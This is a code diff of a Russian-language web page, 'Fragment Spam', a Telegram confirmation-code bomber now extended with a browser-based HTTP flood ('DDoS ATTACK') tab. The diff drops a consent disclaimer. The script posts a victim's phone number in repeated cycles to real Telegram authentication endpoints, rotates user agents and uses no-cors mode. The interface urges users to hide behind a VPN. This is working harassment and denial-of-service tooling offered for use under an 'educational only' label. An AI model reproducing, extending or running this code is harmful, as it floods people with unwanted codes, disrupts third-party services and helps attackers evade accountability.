@@ -3,230 +3,326 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Fragment Spam | Telegram Code Bomber</title>
+    <title>Fragment Spam | Telegram Code Bomber + DDoS</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            user-select: none; /* modern touch */
+        }
+
+        /* CSS Variables for dynamic theming */
+        :root {
+            --bg-gradient-start: #0a0a0a;
+            --bg-gradient-end: #1a0a2e;
+            --card-bg: rgba(15, 5, 25, 0.75);
+            --border-color: rgba(180, 70, 255, 0.5);
+            --text-primary: #e0e0e0;
+            --accent-color: #b77cff;
+            --accent-glow: rgba(180, 70, 255, 0.3);
+            --button-gradient: linear-gradient(135deg, #8b3cff, #c55eff);
+            --button-hover: linear-gradient(135deg, #a14eff, #e07aff);
+            --input-bg: rgba(0, 0, 0, 0.5);
+            --log-bg: #0a0218cc;
+            --vpn-warning-bg: rgba(255, 100, 100, 0.15);
+            --vpn-warning-border: #ff77aa;
+            --success-color: #aaffdd;
+            --error-color: #ffa0b0;
+            --info-color: #bbaaff;
+            --scrollbar-thumb: #b77cff;
+            --backdrop-blur: 12px;
+        }
+
+        /* Light Theme */
+        [data-theme="light"] {
+            --bg-gradient-start: #f5f0ff;
+            --bg-gradient-end: #e0d4ff;
+            --card-bg: rgba(245, 240, 255, 0.85);
+            --border-color: rgba(128, 0, 255, 0.3);
+            --text-primary: #1a1a2e;
+            --accent-color: #7b2cbf;
+            --accent-glow: rgba(128, 0, 255, 0.2);
+            --button-gradient: linear-gradient(135deg, #9b4dff, #b77cff);
+            --button-hover: linear-gradient(135deg, #b77cff, #d49aff);
+            --input-bg: rgba(255, 255, 255, 0.7);
+            --log-bg: rgba(240, 235, 255, 0.9);
+            --vpn-warning-bg: rgba(255, 100, 100, 0.2);
+            --vpn-warning-border: #ff4444;
+            --success-color: #006400;
+            --error-color: #cc0000;
+            --info-color: #4a1a8a;
+            --scrollbar-thumb: #9b4dff;
+        }
+
+        /* Dark Theme */
+        [data-theme="dark"] {
+            --bg-gradient-start: #0a0a0a;
+            --bg-gradient-end: #1a0a2e;
+            --card-bg: rgba(15, 5, 25, 0.85);
+            --border-color: rgba(180, 70, 255, 0.6);
+            --text-primary: #e0e0e0;
+            --accent-color: #c084fc;
+            --accent-glow: rgba(180, 70, 255, 0.4);
+            --button-gradient: linear-gradient(135deg, #8b3cff, #c55eff);
+            --button-hover: linear-gradient(135deg, #a14eff, #e07aff);
+            --input-bg: rgba(0, 0, 0, 0.6);
+            --log-bg: #0a0218cc;
+            --vpn-warning-bg: rgba(255, 100, 100, 0.2);
+            --vpn-warning-border: #ff8888;
+            --success-color: #88ffaa;
+            --error-color: #ff8888;
+            --info-color: #cbaaff;
+            --scrollbar-thumb: #c084fc;
+        }
+
+        /* Cyberpunk Theme */
+        [data-theme="cyberpunk"] {
+            --bg-gradient-start: #0a0f0f;
+            --bg-gradient-end: #1a0033;
+            --card-bg: rgba(10, 5, 20, 0.85);
+            --border-color: #00ffcc;
+            --text-primary: #00ffcc;
+            --accent-color: #00ffcc;
+            --accent-glow: rgba(0, 255, 204, 0.3);
+            --button-gradient: linear-gradient(135deg, #00cc99, #00ffcc);
+            --button-hover: linear-gradient(135deg, #00ffcc, #66ffdd);
+            --input-bg: rgba(0, 20, 20, 0.6);
+            --log-bg: #051010cc;
+            --vpn-warning-bg: rgba(255, 100, 100, 0.2);
+            --vpn-warning-border: #ff4444;
+            --success-color: #00ffcc;
+            --error-color: #ff4466;
+            --info-color: #88ffdd;
+            --scrollbar-thumb: #00ffcc;
         }
 
         body {
+            background: radial-gradient(circle at 20% 30%, var(--bg-gradient-start), var(--bg-gradient-end));
+            font-family: 'Poppins', 'Segoe UI', 'Fira Code', monospace;
+            color: var(--text-primary);
             min-height: 100vh;
-            background: radial-gradient(circle at 20% 30%, #1a0b2e, #0a0515);
-            font-family: 'Poppins', 'Segoe UI', system-ui, -apple-system, 'Inter', sans-serif;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-            position: relative;
-            overflow-x: hidden;
+            transition: background 0.3s ease, color 0.2s ease;
+            backdrop-filter: blur(calc(var(--backdrop-blur) * 0.3));
         }
 
-        /* animated purple vaporwave background */
-        .glow-bg {
+        /* Animated gradient background */
+        .bg-animation {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             z-index: 0;
-            background: 
-                radial-gradient(ellipse at 40% 50%, rgba(156, 39, 176, 0.15) 0%, transparent 60%),
-                repeating-linear-gradient(45deg, rgba(128, 0, 255, 0.02) 0px, rgba(128, 0, 255, 0.02) 2px, transparent 2px, transparent 8px);
+            background: linear-gradient(125deg, var(--bg-gradient-start) 0%, var(--bg-gradient-end) 100%);
+            background-size: 200% 200%;
+            animation: gradientShift 12s ease infinite;
+            opacity: 0.6;
             pointer-events: none;
         }
 
-        /* animated particles */
-        .particles {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 0;
-            pointer-events: none;
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
         }
 
-        .particle {
-            position: absolute;
-            background: rgba(180, 70, 255, 0.3);
-            border-radius: 50%;
-            filter: blur(2px);
-            animation: float linear infinite;
-        }
-
-        @keyframes float {
-            0% { transform: translateY(100vh) translateX(0) rotate(0deg); opacity: 0; }
-            10% { opacity: 0.6; }
-            90% { opacity: 0.4; }
-            100% { transform: translateY(-20vh) translateX(40px) rotate(360deg); opacity: 0; }
-        }
-
-        /* main card */
-        .card {
+        /* Container */
+        .container {
             position: relative;
             z-index: 2;
-            background: rgba(15, 5, 25, 0.75);
-            backdrop-filter: blur(12px);
-            border-radius: 48px;
-            border: 1px solid rgba(180, 70, 255, 0.5);
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5), 0 0 20px rgba(156, 39, 176, 0.3);
-            width: 100%;
-            max-width: 580px;
-            padding: 30px 28px 40px;
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        /* Card */
+        .card {
+            background: var(--card-bg);
+            backdrop-filter: blur(var(--backdrop-blur));
+            border-radius: 32px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4), 0 0 20px var(--accent-glow);
+            padding: 24px 28px;
             transition: all 0.3s ease;
         }
 
-        .card:hover {
-            border-color: #b77cff;
-            box-shadow: 0 0 30px rgba(170, 0, 255, 0.4);
-        }
-
-        h1 {
-            font-size: 2.5rem;
-            font-weight: 800;
-            background: linear-gradient(135deg, #e0aaff, #b77cff, #9c4dff);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
+        /* Header */
+        .header {
             text-align: center;
-            letter-spacing: -0.5px;
-            margin-bottom: 12px;
-            text-shadow: 0 0 8px rgba(156, 39, 176, 0.4);
+            margin-bottom: 24px;
         }
 
-        .sub {
-            text-align: center;
-            color: #ccb5ff;
-            font-size: 0.85rem;
-            border-bottom: 1px dashed rgba(180, 70, 255, 0.5);
-            display: inline-block;
-            width: auto;
-            margin: 0 auto 20px;
-            padding-bottom: 6px;
+        .logo {
+            font-size: 12px;
+            letter-spacing: 6px;
+            color: var(--accent-color);
+            text-shadow: 0 0 8px var(--accent-glow);
         }
 
-        .vpn-warning {
-            background: rgba(255, 100, 100, 0.15);
-            border-left: 3px solid #ff77aa;
-            padding: 12px 16px;
-            border-radius: 20px;
-            margin-bottom: 25px;
-            font-size: 0.8rem;
-            color: #ffb7c5;
+        .logo pre {
+            font-size: 9px;
+            line-height: 1.2;
+            color: var(--accent-color);
+        }
+
+        .status-bar {
             display: flex;
-            align-items: center;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 15px;
+            flex-wrap: wrap;
+        }
+
+        .status-item {
+            background: rgba(0,0,0,0.4);
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 11px;
+            border: 1px solid var(--accent-color);
+        }
+
+        /* Navigation Tabs */
+        .nav {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
             gap: 12px;
-            backdrop-filter: blur(4px);
+            margin-bottom: 28px;
         }
 
-        .vpn-warning span:first-child {
-            font-size: 1.6rem;
+        .nav-item {
+            background: rgba(0,0,0,0.5);
+            padding: 10px 20px;
+            border-radius: 40px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: bold;
+            font-size: 13px;
+            border: 1px solid #444;
+            letter-spacing: 1px;
+            color: var(--text-primary);
         }
 
+        .nav-item:hover {
+            border-color: var(--accent-color);
+            transform: translateY(-2px);
+            box-shadow: 0 0 12px var(--accent-glow);
+        }
+
+        .nav-item.active {
+            background: var(--button-gradient);
+            border-color: var(--accent-color);
+            color: white;
+        }
+
+        /* Sections */
+        .section {
+            display: none;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .section.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(12px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Grid */
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(380px, 1fr));
+            gap: 24px;
+        }
+
+        /* Inputs & Buttons */
         .input-group {
-            margin-bottom: 22px;
+            margin-bottom: 16px;
         }
 
         label {
             display: block;
-            font-size: 0.75rem;
+            margin-bottom: 6px;
+            font-size: 11px;
+            color: var(--accent-color);
             text-transform: uppercase;
-            letter-spacing: 2px;
-            font-weight: 600;
-            color: #cfaaff;
-            margin-bottom: 8px;
-        }
-
-        input {
-            width: 100%;
-            background: rgba(0, 0, 0, 0.5);
-            border: 1.5px solid #5a2a8a;
-            border-radius: 36px;
-            padding: 14px 20px;
-            font-size: 1rem;
-            color: #f0e6ff;
-            transition: all 0.2s;
-            outline: none;
-            font-family: monospace;
-        }
-
-        input:focus {
-            border-color: #b77cff;
-            box-shadow: 0 0 12px #a55eff;
-            background: rgba(0, 0, 0, 0.7);
-        }
-
-        .helper {
-            font-size: 0.7rem;
-            color: #aa88ff;
-            margin-top: 6px;
-            margin-left: 12px;
-        }
-
-        button {
-            background: linear-gradient(95deg, #8b3cff, #c55eff);
-            border: none;
-            width: 100%;
-            padding: 14px;
-            border-radius: 60px;
-            font-weight: bold;
-            font-size: 1.1rem;
             letter-spacing: 1px;
+        }
+
+        input, textarea, select {
+            width: 100%;
+            padding: 12px 16px;
+            background: var(--input-bg);
+            border: 1px solid #5a2a8a;
+            border-radius: 28px;
+            color: var(--text-primary);
+            font-size: 14px;
+            transition: all 0.2s;
+        }
+
+        input:focus, textarea:focus, select:focus {
+            outline: none;
+            border-color: var(--accent-color);
+            box-shadow: 0 0 10px var(--accent-glow);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background: var(--button-gradient);
+            border: none;
+            border-radius: 40px;
             color: white;
+            font-weight: bold;
             cursor: pointer;
             transition: 0.2s;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
-            margin-top: 8px;
+            font-size: 13px;
+            letter-spacing: 1px;
         }
 
-        button:hover {
+        .btn:hover {
             transform: scale(0.98);
-            background: linear-gradient(95deg, #a14eff, #e07aff);
-            box-shadow: 0 0 20px #aa55ff;
+            background: var(--button-hover);
+            box-shadow: 0 0 16px var(--accent-glow);
         }
 
-        button:active {
-            transform: scale(0.96);
+        .btn-danger {
+            background: linear-gradient(135deg, #ff3366, #cc0044);
         }
 
+        /* Log Area */
         .log-area {
-            background: #0a0218cc;
-            border-radius: 28px;
-            margin-top: 28px;
+            background: var(--log-bg);
+            border-radius: 24px;
+            margin-top: 24px;
             padding: 16px;
-            border: 1px solid #6533aa;
-            font-family: 'Fira Code', monospace;
-            font-size: 0.75rem;
+            border: 1px solid var(--accent-color);
+            font-family: monospace;
+            font-size: 12px;
             max-height: 280px;
             overflow-y: auto;
             color: #cbb5ff;
         }
 
         .log-line {
-            padding: 5px 8px;
+            padding: 6px 8px;
             border-bottom: 1px solid rgba(180, 70, 255, 0.2);
-            font-family: monospace;
             white-space: pre-wrap;
             word-break: break-word;
         }
 
-        .success {
-            color: #aaffdd;
-        }
-        .error {
-            color: #ffa0b0;
-        }
-        .info {
-            color: #bbaaff;
-        }
+        .success { color: var(--success-color); }
+        .error { color: var(--error-color); }
+        .info { color: var(--info-color); }
+
+        /* Loading Spinner */
         .loading {
             display: inline-block;
             width: 14px;
             height: 14px;
-            border: 2px solid #c084fc;
+            border: 2px solid var(--accent-color);
             border-top-color: transparent;
             border-radius: 50%;
             animation: spin 0.6s linear infinite;
@@ -238,181 +334,229 @@
             to { transform: rotate(360deg); }
         }
 
-        /* DISCLAIMER MODAL */
-        .disclaimer-overlay {
+        /* Settings Panel (Gear) */
+        .settings-icon {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.85);
-            backdrop-filter: blur(12px);
-            z-index: 1000;
+            bottom: 24px;
+            right: 24px;
+            background: var(--card-bg);
+            backdrop-filter: blur(10px);
+            width: 52px;
+            height: 52px;
+            border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            transition: all 0.2s;
-        }
-
-        .disclaimer-card {
-            background: #120c1f;
-            border-radius: 40px;
-            max-width: 460px;
-            width: 90%;
-            padding: 32px 28px;
-            border: 1px solid #aa55ff;
-            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.5);
-            text-align: center;
-        }
-
-        .disclaimer-card h3 {
-            color: #ff77dd;
-            margin-bottom: 20px;
-            font-size: 1.8rem;
-        }
-
-        .disclaimer-text {
-            color: #ddd;
-            font-size: 0.9rem;
-            line-height: 1.5;
-            text-align: left;
-            margin: 20px 0;
-        }
-
-        .checkbox-label {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin: 20px 0;
-            color: #ddc;
             cursor: pointer;
+            font-size: 28px;
+            border: 1px solid var(--accent-color);
+            z-index: 100;
+            transition: transform 0.2s;
+        }
+        .settings-icon:hover {
+            transform: rotate(20deg);
+            box-shadow: 0 0 15px var(--accent-glow);
         }
 
-        .checkbox-label input {
-            width: 20px;
-            height: 20px;
-            accent-color: #aa55ff;
+        /* Draggable Settings Modal */
+        .settings-modal {
+            position: fixed;
+            top: 20%;
+            left: 30%;
+            width: 340px;
+            background: var(--card-bg);
+            backdrop-filter: blur(20px);
+            border-radius: 28px;
+            border: 1px solid var(--accent-color);
+            box-shadow: 0 20px 35px rgba(0,0,0,0.5);
+            z-index: 1000;
+            display: none;
+            flex-direction: column;
+            cursor: move;
+            transition: box-shadow 0.2s;
         }
-
-        .agree-btn {
-            background: #9b4dff;
-            width: auto;
-            padding: 12px 30px;
-            border-radius: 40px;
+        .settings-header {
+            padding: 14px 18px;
+            background: rgba(0,0,0,0.3);
+            border-bottom: 1px solid var(--accent-color);
+            border-radius: 28px 28px 0 0;
             font-weight: bold;
-            border: none;
-            color: white;
-            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: move;
         }
-
-        .agree-btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
+        .settings-header button {
+            background: none;
+            border: none;
+            font-size: 20px;
+            cursor: pointer;
+            color: var(--text-primary);
+        }
+        .settings-body {
+            padding: 20px;
+        }
+        .settings-row {
+            margin-bottom: 20px;
+        }
+        .settings-row label {
+            font-size: 12px;
+        }
+        input[type="range"] {
+            width: 100%;
+            margin: 8px 0;
+        }
+        .theme-buttons {
+            display: flex;
+            gap: 12px;
+            margin-top: 8px;
+        }
+        .theme-btn {
+            flex: 1;
+            padding: 8px;
+            border-radius: 30px;
+            background: var(--input-bg);
+            border: 1px solid var(--accent-color);
+            color: var(--text-primary);
+            cursor: pointer;
+            text-align: center;
+            font-size: 12px;
+        }
+        .theme-btn.active {
+            background: var(--button-gradient);
+            color: white;
         }
 
         footer {
             text-align: center;
-            margin-top: 24px;
-            font-size: 0.7rem;
+            margin-top: 32px;
+            font-size: 11px;
             color: #7a62a5;
         }
 
-        a {
-            color: #b87cff;
-            text-decoration: none;
+        /* Scrollbar */
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: #1a1a1a; }
+        ::-webkit-scrollbar-thumb { background: var(--scrollbar-thumb); border-radius: 10px; }
+
+        @media (max-width: 780px) {
+            .grid { grid-template-columns: 1fr; }
+            .settings-modal { width: 90%; left: 5%; top: 15%; }
         }
     </style>
 </head>
 <body>
-<div class="glow-bg"></div>
-<div class="particles" id="particles"></div>
+<div class="bg-animation"></div>
+<div class="settings-icon" id="settingsIcon">⚙️</div>
 
-<div id="disclaimerOverlay" class="disclaimer-overlay">
-    <div class="disclaimer-card">
-        <h3>⚠️ DISCLAIMER</h3>
-        <div class="disclaimer-text">
-            <p><strong>ВНИМАНИЕ!</strong> Данный инструмент предназначен <strong>исключительно для образовательных целей</strong> и тестирования собственных систем на уязвимости.</p>
-            <p style="margin-top: 12px;">Использование спам-атак на сторонние сервисы без согласия владельцев может нарушать законы вашей страны. Администрация не несёт ответственности за ваши действия.</p>
-            <p style="margin-top: 12px;">При отправке запросов ваш <strong>IP-адрес будет виден</strong> целевым серверам. Настоятельно рекомендуется использовать <strong style="color:#ff99cc;">VPN / Proxy</strong> для анонимности.</p>
-            <p style="margin-top: 12px;">Нажимая «Принимаю», вы подтверждаете, что достигли совершеннолетия и берете всю ответственность на себя.</p>
+<div id="settingsModal" class="settings-modal">
+    <div class="settings-header" id="settingsHeader">
+        <span>⚙️ НАСТРОЙКИ</span>
+        <button id="closeSettings">&times;</button>
+    </div>
+    <div class="settings-body">
+        <div class="settings-row">
+            <label>🎨 ТЕМА</label>
+            <div class="theme-buttons">
+                <div class="theme-btn" data-theme="dark">Тёмная</div>
+                <div class="theme-btn" data-theme="light">Светлая</div>
+                <div class="theme-btn" data-theme="cyberpunk">Cyberpunk</div>
+            </div>
         </div>
-        <label class="checkbox-label">
-            <input type="checkbox" id="consentCheckbox"> Я ознакомлен и принимаю условия
-        </label>
-        <button id="acceptBtn" class="agree-btn" disabled>ПРИНЯТЬ И ПРОДОЛЖИТЬ</button>
+        <div class="settings-row">
+            <label>🌀 СКОРОСТЬ АНИМАЦИИ (ms)</label>
+            <input type="range" id="animSpeed" min="0" max="500" value="300">
+            <span id="speedVal">300ms</span>
+        </div>
+        <div class="settings-row">
+            <label>🌸 РАЗМЫТИЕ (blur)</label>
+            <input type="range" id="blurLevel" min="0" max="20" step="1" value="12">
+            <span id="blurVal">12px</span>
+        </div>
+        <div class="settings-row">
+            <label>🖌️ АНИМАЦИЯ ГРАДИЕНТА</label>
+            <div class="theme-buttons">
+                <div class="theme-btn" id="gradientFast">Быстро</div>
+                <div class="theme-btn" id="gradientSlow">Медленно</div>
+                <div class="theme-btn" id="gradientStop">Стоп</div>
+            </div>
+        </div>
     </div>
 </div>
 
-<div class="card" id="mainApp" style="opacity:0; transform: translateY(20px); transition: all 0.5s ease;">
-    <h1>✧ FRAGMENT SPAM ✧</h1>
-    <div style="text-align: center; margin-bottom: 8px;">
-        <span class="sub">telegram confirmation code bomber</span>
-    </div>
+<div class="container">
+    <div class="card">
+        <div class="header">
+            <div class="logo">
+                <pre>
+███████╗███╗   ██╗ ██████╗ ███████╗███████╗██████╗ 
+██╔════╝████╗  ██║██╔═══██╗██╔════╝██╔════╝██╔══██╗
+███████╗██╔██╗ ██║██║   ██║███████╗█████╗  ██████╔╝
+╚════██║██║╚██╗██║██║   ██║╚════██║██╔══╝  ██╔══██╗
+███████║██║ ╚████║╚██████╔╝███████║███████╗██║  ██║
+╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝
+                </pre>
+            </div>
+            <div class="status-bar">
+                <div class="status-item">🔥 STATUS: <span>ACTIVE</span></div>
+                <div class="status-item">👤 DEV: <span>@cat_winger</span></div>
+                <div class="status-item">⚡ VERSION: <span>v2.0</span></div>
+            </div>
+        </div>
 
-    <div class="vpn-warning">
-        <span>🛡️</span>
-        <span><strong>VPN рекомендуется!</strong> Ваш реальный IP будет виден при спаме. Используйте VPN/прокси для безопасности.</span>
-    </div>
+        <div class="nav">
+            <div class="nav-item active" data-section="spam">💣 SMS BOMBER</div>
+            <div class="nav-item" data-section="ddos">🌐 DDOS ATTACK</div>
+        </div>
 
-    <div class="input-group">
-        <label>📞 НОМЕР ТЕЛЕФОНА (С +)</label>
-        <input type="tel" id="phoneNumber" placeholder="+79123456789" value="+7">
-        <div class="helper">Пример: +79123456789</div>
-    </div>
+        <!-- SMS BOMBER TAB -->
+        <div class="section active" id="spam-section">
+            <div class="vpn-warning" style="background: var(--vpn-warning-bg); border-left: 3px solid var(--vpn-warning-border); padding: 12px 16px; border-radius: 20px; margin-bottom: 20px;">
+                <span>🛡️</span> <strong>VPN рекомендуется!</strong> Ваш реальный IP будет виден. Используйте VPN для безопасности.
+            </div>
+            <div class="input-group">
+                <label>📞 НОМЕР ТЕЛЕФОНА (С +)</label>
+                <input type="tel" id="phoneNumber" placeholder="+79123456789" value="+7">
+            </div>
+            <div class="input-group">
+                <label>🌀 КОЛИЧЕСТВО ЦИКЛОВ (1 цикл = 5 запросов)</label>
+                <input type="number" id="cyclesCount" min="1" max="50" value="3">
+            </div>
+            <button id="startBtn" class="btn">💣 ЗАПУСТИТЬ СПАМ</button>
+            <div class="log-area" id="logContainer">
+                <div class="log-line info">⚡ Готов к работе. Введи номер и количество циклов.</div>
+                <div class="log-line info">🔐 Запросы отправляются напрямую через fetch API.</div>
+            </div>
+        </div>
 
-    <div class="input-group">
-        <label>🌀 КОЛИЧЕСТВО ЦИКЛОВ (1 цикл = 5 запросов)</label>
-        <input type="number" id="cyclesCount" min="1" max="50" value="3">
-        <div class="helper">Чем больше циклов, тем дольше ожидание между сериями (3 сек пауза)</div>
+        <!-- DDOS ATTACK TAB (Browser-based HTTP Flooder) -->
+        <div class="section" id="ddos-section">
+            <div class="vpn-warning" style="background: var(--vpn-warning-bg); border-left: 3px solid var(--vpn-warning-border); padding: 12px 16px; border-radius: 20px; margin-bottom: 20px;">
+                <span>⚠️</span> <strong>Только для образовательных целей!</strong> DDoS-атаки могут быть незаконны. Используйте на свой страх и риск.
+            </div>
+            <div class="input-group">
+                <label>🎯 ЦЕЛЕВОЙ URL (http:// или https://)</label>
+                <input type="text" id="ddosTarget" placeholder="https://example.com">
+            </div>
+            <div class="input-group">
+                <label>⚡ КОЛИЧЕСТВО ПОТОКОВ (1-200)</label>
+                <input type="number" id="ddosThreads" min="1" max="200" value="50">
+            </div>
+            <div class="input-group">
+                <label>⏱️ ДЛИТЕЛЬНОСТЬ (сек)</label>
+                <input type="number" id="ddosDuration" min="5" max="300" value="30">
+            </div>
+            <button id="ddosStartBtn" class="btn btn-danger">💥 ЗАПУСТИТЬ DDoS</button>
+            <div class="log-area" id="ddosLogContainer">
+                <div class="log-line info">⚙️ Готов к HTTP флуду. Укажите URL и параметры.</div>
+            </div>
+        </div>
+        <footer>by @cat_winger | educational only | fragment spam + ddos module</footer>
     </div>
-
-    <button id="startBtn">💣 ЗАПУСТИТЬ СПАМ</button>
-
-    <div class="log-area" id="logContainer">
-        <div class="log-line info">⚡ Готов к работе. Введи номер и количество циклов.</div>
-        <div class="log-line info">🔐 Запросы отправляются напрямую (CORS может блокировать ответы, но запросы уходят).</div>
-    </div>
-    <footer>by @IshakPlayer | fragment spam tool | educational only</footer>
 </div>
 
 <script>
-    // ------------------------- DISCLAIMER LOGIC (localStorage) -------------------------
-    const disclaimerKey = 'fragment_spam_consent_v1';
-    const overlay = document.getElementById('disclaimerOverlay');
-    const mainCard = document.getElementById('mainApp');
-    const consentCheck = document.getElementById('consentCheckbox');
-    const acceptBtn = document.getElementById('acceptBtn');
-
-    function hideDisclaimer() {
-        overlay.style.display = 'none';
-        mainCard.style.opacity = '1';
-        mainCard.style.transform = 'translateY(0px)';
-        localStorage.setItem(disclaimerKey, 'true');
-    }
-
-    // check if already accepted
-    if (localStorage.getItem(disclaimerKey) === 'true') {
-        overlay.style.display = 'none';
-        mainCard.style.opacity = '1';
-        mainCard.style.transform = 'translateY(0px)';
-    } else {
-        overlay.style.display = 'flex';
-        mainCard.style.opacity = '0';
-    }
-
-    consentCheck.addEventListener('change', function(e) {
-        acceptBtn.disabled = !e.target.checked;
-    });
-
-    acceptBtn.addEventListener('click', function() {
-        if (consentCheck.checked) {
-            hideDisclaimer();
-        } else {
-            alert('Пожалуйста, подтвердите согласие с условиями.');
-        }
-    });
-
-    // ---------- ENDPOINTS (как в оригинальном скрипте) ----------
+    // ======================== ENDPOINTS FOR SMS SPAMMER ========================
     const endpoints = [
         'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
         'https://translations.telegram.org/auth/request',
@@ -428,6 +572,7 @@
         'https://my.telegram.org/auth/send_password'
     ];
 
+    // DOM elements
     const logContainer = document.getElementById('logContainer');
     const phoneInput = document.getElementById('phoneNumber');
     const cyclesInput = document.getElementById('cyclesCount');
@@ -442,174 +587,271 @@
         logContainer.scrollTop = logContainer.scrollHeight;
     }
 
-    function clearLogs() {
-        logContainer.innerHTML = '';
-        addLog('Очистка лога. Новая сессия.', 'info');
-    }
-
-    // случайный user-agent
-    const userAgents = [
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
-        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
-        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1'
-    ];
     function getRandomUA() {
-        return userAgents[Math.floor(Math.random() * userAgents.length)];
+        const uas = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
+        ];
+        return uas[Math.floor(Math.random() * uas.length)];
     }
 
-    // Функция отправки одного POST-запроса на эндпоинт
     async function sendRequest(endpoint, phone) {
         const controller = new AbortController();
-        const timeoutId = setTimeout(() => controller.abort(), 8000);
+        const timeoutId = setTimeout(() => controller.abort(), 7000);
         try {
             const headers = {
                 'User-Agent': getRandomUA(),
                 'Content-Type': 'application/x-www-form-urlencoded',
-                'Accept': 'application/json, text/plain, */*',
-                'Origin': new URL(endpoint).origin,
-                'Referer': endpoint
+                'Accept': '*/*'
             };
             const body = `phone=${encodeURIComponent(phone)}`;
-            // Используем fetch с mode 'cors' (обычный). Из-за CORS может быть ошибка, но запрос все равно попытается уйти.
-            // В режиме 'no-cors' мы не увидим ответ, но ошибка не будет блокировать. Выберем стандартный режим,
-            // чтобы была видна ошибка CORS, но пользователь увидит предупреждение.
-            const response = await fetch(endpoint, {
+            await fetch(endpoint, {
                 method: 'POST',
                 headers: headers,
                 body: body,
-                mode: 'cors',   // стандартный режим, если CORS блокирует - получим ошибку
-                credentials: 'omit'
+                mode: 'no-cors',
+                credentials: 'omit',
+                signal: controller.signal
             });
             clearTimeout(timeoutId);
-            // Если ответ 2xx или 3xx или 4xx, всё равно считаем что запрос отправлен (сервер получил)
-            return { ok: true, status: response.status };
+            return { ok: true };
         } catch (err) {
             clearTimeout(timeoutId);
-            // Если ошибка сети или CORS, но запрос всё же мог уйти (preflight может не пройти). Всё равно фиксируем попытку.
-            // В целях реализма: большинство эндпоинтов имеют CORS политику, блокирующую браузерные запросы.
-            // Поэтому информируем пользователя, что запрос технически отправлен, но ответ не получен.
-            if (err.name === 'AbortError') {
-                return { ok: false, error: 'Таймаут' };
-            }
-            // CORS ошибка или NetworkError - но мы считаем как "отправлено, но заблокировано CORS"
-            return { ok: false, error: err.message, corsBlock: true };
+            return { ok: false, error: err.message };
         }
     }
 
-    // Основной спам: циклы, внутри каждого цикла проход по эндпоинтам (5 запросов в цикле? Внимание: endpoints.length = 12)
-    // По заданию: "1 цикл 5 запросов". Но в python скрипте отправлялись все эндпоинты (12) за цикл. 
-    // Однако клиент хочет: 1 цикл = 5 запросов. Сделаем так: за цикл отправляем первые 5 эндпоинтов (или все, если меньше?).
-    // Но лучше сделать гибко: за один цикл будем отправлять ровно 5 запросов, выбирая случайные эндпоинты или первые 5.
-    // Для соответствия "1 цикл = 5 запросов" изменим логику: цикл содержит ровно 5 отправок.
-    // Я реализую отправку 5 запросов за цикл (выбираем 5 разных эндпоинтов, можно повторять? лучше брать первые 5 или случайные)
-    // Для более агрессивного спама — будем брать 5 разных эндпоинтов из списка (без повторов в цикле, но в следующем цикле можно повторить).
-    
     async function runSpam(phone, totalCycles) {
-        if (!phone.match(/^\+\d{10,15}$/)) {
-            addLog('❌ Ошибка: номер должен начинаться с "+" и содержать 10-15 цифр', 'error');
-            return false;
-        }
-
         let totalSuccess = 0;
         let totalFailed = 0;
-        const requestsPerCycle = 5; // строго 5 запросов за цикл
-
+        const requestsPerCycle = 5;
         for (let cycle = 1; cycle <= totalCycles; cycle++) {
